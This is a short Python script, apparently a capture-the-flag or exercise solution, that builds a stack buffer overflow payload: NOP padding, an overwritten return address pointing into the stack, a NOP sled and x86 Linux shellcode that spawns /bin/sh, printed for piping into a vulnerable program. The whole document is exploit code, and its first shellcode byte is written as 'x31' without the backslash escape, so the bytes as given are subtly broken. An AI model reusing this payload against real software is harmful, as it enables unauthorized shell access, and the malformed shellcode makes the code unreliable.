import struct

buffer = '\x90' * 76

eip = struct.pack("I",0xbffff7ac+30)

payload = '\x90'*100

shellcode = 'x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

out = buffer + eip + payload + shellcode
print(out)